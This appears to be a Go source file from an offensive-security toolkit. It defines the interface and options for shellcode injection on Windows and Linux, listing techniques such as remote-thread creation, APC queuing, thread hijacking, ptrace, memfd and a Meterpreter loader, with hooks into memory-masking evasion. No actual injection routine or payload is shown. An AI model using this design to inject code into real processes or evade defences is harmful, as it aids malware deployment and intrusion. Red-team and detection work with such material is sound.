// Package inject provides unified shellcode injection techniques
// for Windows and Linux platforms.
package inject

import "errors"

var ErrNotSupported = errors.New("injection method not supported on this platform")

// Method identifies the injection technique.
type Method string

// Windows methods
const (
	MethodCreateRemoteThread  Method = "crt"
	MethodCreateThread        Method = "ct"
	MethodQueueUserAPC        Method = "apc"
	MethodEarlyBirdAPC        Method = "earlybird"
	MethodThreadHijack Method = "threadhijack"

	// MethodProcessHollowing is deprecated: use MethodThreadHijack.
	// This is actually Thread Execution Hijacking (T1055.003), not PE hollowing.
	MethodProcessHollowing = MethodThreadHijack
	MethodRtlCreateUserThread Method = "rtl"

	// Deprecated: MethodDirectSyscall is a legacy path. Use NewWindowsInjector
	// with SyscallMethod: wsyscall.MethodDirect instead.
	MethodDirectSyscall Method = "syscall"

	MethodCreateFiber Method = "fiber"
	MethodEtwpCreateEtwThread    Method = "etwthr"
	MethodNtQueueApcThreadEx     Method = "apcex"
)

// Linux methods
const (
	MethodPtrace  Method = "ptrace"
	MethodMemFD   Method = "memfd"
	MethodProcMem Method = "procmem"
)

// Purego methods (Linux/macOS, no CGO)
const (
	MethodPureGoShellcode   Method = "purego"
	MethodPureGoMeterpreter Method = "purego-meter"
)

// Injector performs shellcode injection.
type Injector interface {
	Inject(shellcode []byte) error
}

// Region identifies a memory range in the current process that a
// self-injection method allocated for shellcode. Callers receive one from
// SelfInjector.InjectedRegion after a successful self-process Inject and
// can pass it to evasion/sleepmask.Mask or cleanup/memory.WipeAndFree
// without having to re-derive the address and size.
type Region struct {
	Addr uintptr
	Size uintptr
}

// SelfInjector is optionally implemented by injectors whose target is the
// current process. Callers may type-assert an Injector to SelfInjector to
// learn where the last Inject call placed the shellcode:
//
//	inj, _ := inject.NewWindowsInjector(cfg) // e.g. MethodCreateThread
//	if err := inj.Inject(shellcode); err != nil { return err }
//	if self, ok := inj.(inject.SelfInjector); ok {
//	    if r, ok := self.InjectedRegion(); ok {
//	        mask := sleepmask.New(sleepmask.Region{Addr: r.Addr, Size: r.Size})
//	        mask.Sleep(30 * time.Second)
//	    }
//	}
//
// Cross-process methods (CreateRemoteThread, QueueUserAPC, EarlyBird APC,
// ThreadHijack, RtlCreateUserThread, NtQueueApcThreadEx) allocate in the
// target process, so on those paths InjectedRegion returns (Region{}, false).
// Before the first successful Inject, or after a failed Inject, it also
// returns (Region{}, false).
//
// The decorators (WithValidation, WithCPUDelay, WithXOR) transparently
// forward InjectedRegion to the wrapped injector, so the pattern works
// across chains.
type SelfInjector interface {
	Injector
	InjectedRegion() (Region, bool)
}

// regionRecorder is the shared SelfInjector state embedded into concrete
// injectors and Pipeline. It exposes InjectedRegion() via method promotion
// so each embedding type picks up the SelfInjector contract for free, and
// record() is the single setter the self-process paths call on success.
type regionRecorder struct {
	last Region
	has  bool
}

func (r *regionRecorder) record(addr, size uintptr) {
	r.last = Region{Addr: addr, Size: size}
	r.has = true
}

func (r *regionRecorder) InjectedRegion() (Region, bool) {
	return r.last, r.has
}

// Config configures an injection.
type Config struct {
	Method      Method
	PID         int    // target PID (0 = self for procmem/ct/purego)
	ProcessPath string // path to spawn (earlybird, hollow)
	Fallback    bool   // try alternate methods on failure
}
